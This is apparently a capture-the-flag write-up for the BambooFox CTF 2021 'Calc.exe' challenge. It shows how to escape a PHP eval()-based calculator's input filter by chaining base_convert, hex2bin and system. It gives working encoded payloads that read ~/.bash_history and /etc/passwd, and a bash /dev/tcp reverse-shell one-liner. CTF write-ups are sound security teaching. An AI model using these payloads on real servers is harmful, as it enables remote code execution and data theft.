# Calc.exe

This challenge was part of BambooFox CTF 2021 and consisted in a classic online calculator app written in PHP.

## The challange

Upon accessing the [source](chall.ctf.bamboofox.tw:13377/?source) code, we can see that the application executes the mathematical expressions using the PHP [eval()](https://www.php.net/manual/en/function.eval.php) function and tries to avoid code injection by using some input validation technique based on a 'Accept Known Good' policy. As such, theres a regular expression to filter the input, only allowing characteres that can be part of a valid expression along with some mathematical functions.

## Bypassing the validation

The injection of code in this scenario doesn't seem very likely at first glance, but in a more detailed inspection I realized that an interesting function was allowed: [base_convert](https://www.php.net/manual/en/function.base-convert). This function can be used to convert numbers between different bases (up to base 36). My first tought was to use it to convert names of functions that are valid numbers in base 36, such as ``system`` and ``eval`` to integers and then use this same function again to convert it back inside the when the expression is evaluated. For example, to execute an ``ls`` on the server, we would write ``base_convert(1751504350,10,36)(base_convert(784,10,36))`` as input to the calculator and because of the way ``eval`` works, it would execute the conversion between bases and then execute ``system(ls)`` when the result is attributed to a variable inside the evaluated code.

The problem is that in base 36, we are limited to write only letters (a-z) and numbers (0-9) to represent integers. As such, we can't write something like ``ls ~/`` to list the contents of the home directory or ``bash -i >& /dev/tcp/LHOST/LPORT 0>&1`` to get a reverse shell. Luckily, as we can write any function name that is a valid base 36 integer, we can use bin2hex and hex2bin to bypass this limitation.

On most cases (including on this one), the maximum size of a integer in PHP is 2^32 bits, what means we need to limit each input to ``base_convert`` to strings representing numbers of a maximum of 4 bytes in length and if necessary, split such string to various pieaces and concatenate them together with a . (dot). So, now we can execute any linux command by splitting it in chunks of 4 or less bytes, converting each chunk to hex, converting this hex string to a integer using base_convert that is placed inside another call to ``base_convert(HEX_CHUNK,10,36)`` and then finally concatenating them inside an equaly crafted call to ``hex2bin`` that is then placed inside of a call to ``system`` ... and it should be executed as long as our final payload is smaller than 1024 bytes (another limitation imposed by this app).

It would look something like:

```
base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(chunk1,10,36).base_convert(chunk2,10,36).base_convert(chunk3,10,36)...))
```

Examples:


```
cat ~/.bash_history :
base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(477080140104,10,36).base_convert(750604760176249,10,36).base_convert(719870953460193,10,36).base_convert(719940671000037,10,36)))

cat /etc/passwd :
base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(477080140104,10,36).base_convert(189751590363,10,36).base_convert(189803607951,10,36).base_convert(428637964,10,36)))

```

## The flag

Having found a way to bypass the input validation, we can focus on finding the flag inside the server. To do this, I got a reverse shell which I used to explore the server and after a few minutes looking in the usual places (in the current directory, command history, environment variables, etc.) I found the variable in the root directory /, on a file named flag_{a hexadecimal string which I don't remember :p}.

## And that's all, folks.
